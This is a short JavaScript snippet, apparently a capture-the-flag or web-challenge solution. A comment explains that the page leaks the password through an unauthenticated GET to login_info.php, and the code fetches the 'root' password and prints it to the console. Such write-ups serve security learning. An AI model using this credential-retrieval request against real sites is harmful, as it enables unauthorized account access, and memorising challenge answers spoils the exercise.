/*
 * At the javascript on the bottom of the page, you'll notice the that
 * the password is checked by retrieving the actual password using
 * a get request to login_info.php. Since you don't need any authentication
 * to see the password, just paste the following javascript into the console
 * and get the password, login with it and there you have the answer phrase!
 */
$.get('login_info.php', { 'username': 'root' }, function(data) {
  console.log(data);
});